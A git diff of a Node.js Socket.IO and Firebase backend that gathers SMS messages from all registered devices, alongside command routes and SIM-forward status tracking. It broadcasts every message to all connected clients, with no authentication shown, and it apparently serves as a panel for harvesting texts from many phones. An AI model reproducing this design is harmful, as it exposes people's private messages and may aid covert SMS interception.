@@ -1,4 +1,3 @@
-
 import dotenv from "dotenv";
 dotenv.config();
 
@@ -14,6 +13,7 @@ import adminRoutes from "./routes/adminRoutes.js";
 import notificationRoutes from "./routes/notificationRoutes.js";
 import checkRoutes from "./routes/checkRoutes.js";
 import commandRoutes from "./routes/commandRoutes.js";
+import smsRoutes from "./routes/notificationRoutes.js"; // ⭐ NEW - SMS routes (REST)
 
 const PORT = process.env.PORT || 5000;
 const app = express();
@@ -31,6 +31,9 @@ app.set("io", io);
 
 const deviceSockets = new Map();
 let lastDevicesList = [];
+
+// ⭐ NEW: SMS LIVE cache (All SMS list)
+let lastSmsAllList = [];
 
 /* ---------------- ID Cleaner ---------------- */
 const clean = (id) => id?.toString()?.trim()?.toUpperCase();
@@ -110,6 +113,88 @@ async function refreshDevicesLive(reason = "") {
 }
 
 /* ======================================================
+      ⭐ SMS LIVE HELPERS (for /api/sms/all & /api/sms/:uniqueid)
+====================================================== */
+
+const SMS_NODE = "smsNotifications"; // RTDB node
+
+// Flatten all SMS from RTDB → single array (all devices)
+async function buildAllSmsList() {
+  const snap = await rtdb.ref(SMS_NODE).get();
+
+  if (!snap.exists()) return [];
+
+  const raw = snap.val() || {};
+  const finalList = [];
+
+  Object.entries(raw).forEach(([uniqueid, messages]) => {
+    Object.entries(messages || {}).forEach(([msgId, msgObj]) => {
+      finalList.push({
+        id: msgId,
+        uniqueid,
+        ...msgObj,
+      });
+    });
+  });
+
+  // Sort by timestamp desc (same as controller)
+  finalList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  return finalList;
+}
+
+// Flatten only single device's SMS
+function buildDeviceSmsListFromSnap(uid, rawMessages) {
+  if (!rawMessages) return [];
+
+  const list = Object.entries(rawMessages).map(([id, obj]) => ({
+    id,
+    uniqueid: uid,
+    ...obj,
+  }));
+
+  list.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  return list;
+}
+
+// Push ALL SMS list to all clients
+async function refreshSmsAllLive(reason = "") {
+  try {
+    const finalList = await buildAllSmsList();
+    lastSmsAllList = finalList;
+
+    io.emit("smsLogsAllLive", {
+      success: true,
+      reason,
+      count: finalList.length,
+      data: finalList,
+    });
+
+    console.log(
+      `📨 smsLogsAllLive pushed (${reason}) → ${finalList.length} messages`
+    );
+  } catch (err) {
+    console.error("❌ refreshSmsAllLive ERROR:", err.message);
+  }
+}
+
+// Push SMS of a single device to all clients
+function emitSmsDeviceLive(uid, messages, event = "update") {
+  const list = buildDeviceSmsListFromSnap(uid, messages);
+
+  io.emit("smsLogsByDeviceLive", {
+    success: true,
+    uniqueid: uid,
+    event,
+    count: list.length,
+    data: list,
+  });
+
+  console.log(
+    `📨 smsLogsByDeviceLive → uid=${uid}, event=${event}, count=${list.length}`
+  );
+}
+
+/* ======================================================
       SOCKET.IO CONNECTION HANDLING
 ====================================================== */
 io.on("connection", (socket) => {
@@ -117,11 +202,18 @@ io.on("connection", (socket) => {
 
   let currentDeviceId = null;
 
-  // Send initial list
+  // Send initial devices list
   socket.emit("devicesLive", {
     success: true,
     count: lastDevicesList.length,
     data: lastDevicesList,
+  });
+
+  // ⭐ Send initial SMS ALL LIST (for messages.html page)
+  socket.emit("smsLogsAllLive", {
+    success: true,
+    count: lastSmsAllList.length,
+    data: lastSmsAllList,
   });
 
   /* ========== DEVICE REGISTRATION VIA SOCKET ========== */
@@ -545,15 +637,19 @@ function handleSimForwardChange(snap, event = "update") {
   const raw = snap.val() || {};
 
   // Always return BOTH 0 and 1
-  const sim0 = raw["0"] ? {
-      status: raw["0"].status || "unknown",
-      updatedAt: raw["0"].updatedAt || null
-    } : null;
+  const sim0 = raw["0"]
+    ? {
+        status: raw["0"].status || "unknown",
+        updatedAt: raw["0"].updatedAt || null,
+      }
+    : null;
 
-  const sim1 = raw["1"] ? {
-      status: raw["1"].status || "unknown",
-      updatedAt: raw["1"].updatedAt || null
-    } : null;
+  const sim1 = raw["1"]
+    ? {
+        status: raw["1"].status || "unknown",
+        updatedAt: raw["1"].updatedAt || null,
+      }
+    : null;
 
   const sims = { 0: sim0, 1: sim1 };
 
@@ -566,7 +662,7 @@ function handleSimForwardChange(snap, event = "update") {
 
   console.log(
     `📶 simForwardStatusUpdate → uid=${uid}, event=${event}, ` +
-    `SIM0=${sim0?.status || "null"}, SIM1=${sim1?.status || "null"}`
+      `SIM0=${sim0?.status || "null"}, SIM1=${sim1?.status || "null"}`
   );
 }
 
@@ -580,6 +676,44 @@ simForwardRef.on("child_removed", (snap) =>
   handleSimForwardChange(snap, "removed")
 );
 
+/* ======================================================
+      ⭐ NEW: SMS LOGS LIVE (smsNotifications node)
+      - Covers:
+          /api/sms/all           → event: smsLogsAllLive
+          /api/sms/:uniqueid     → event: smsLogsByDeviceLive
+====================================================== */
+
+const smsNotificationsRef = rtdb.ref(SMS_NODE);
+
+// Handle per-device branch
+async function handleSmsNotificationsBranch(snap, event = "update") {
+  const uid = snap.key;
+  const messages = snap.val() || {};
+
+  // Emit per-device live list
+  emitSmsDeviceLive(uid, messages, event);
+
+  // Rebuild and emit full ALL-SMS list
+  await refreshSmsAllLive(`sms_${event}:${uid}`);
+}
+
+smsNotificationsRef.on("child_added", (snap) =>
+  handleSmsNotificationsBranch(snap, "added")
+);
+smsNotificationsRef.on("child_changed", (snap) =>
+  handleSmsNotificationsBranch(snap, "changed")
+);
+smsNotificationsRef.on("child_removed", async (snap) => {
+  const uid = snap.key;
+
+  // If branch removed → send empty list for that uid
+  emitSmsDeviceLive(uid, {}, "removed");
+  await refreshSmsAllLive(`sms_removed:${uid}`);
+});
+
+/* ======================================================
+      REGISTERED DEVICES LIVE REFRESH
+====================================================== */
 
 const registeredDevicesRef = rtdb.ref("registeredDevices");
 
@@ -595,7 +729,6 @@ registeredDevicesRef.on("child_removed", () => {
   refreshDevicesLive("registered_removed");
 });
 
-
 app.get("/api/devices", async (req, res) => {
   try {
     const devices = await buildDevicesList();
@@ -610,18 +743,27 @@ app.get("/api/devices", async (req, res) => {
   }
 });
 
+/* ======================================================
+      INITIAL LIVE PUSH
+====================================================== */
+
 refreshDevicesLive("initial");
+refreshSmsAllLive("initial"); // ⭐ NEW: initial SMS all list build
+
+/* ======================================================
+      ROUTES
+====================================================== */
 
 app.use(adminRoutes);
 app.use(notificationRoutes);
 app.use("/api", checkRoutes);
 app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
+app.use(smsRoutes); // ⭐ NEW - all /api/sms/... routes
 
 app.get("/", (_, res) => {
   res.send(" RTDB + Socket.IO Backend Running");
 });
-
 
 server.listen(PORT, () => {
   console.log(` Server running on PORT ${PORT}`);
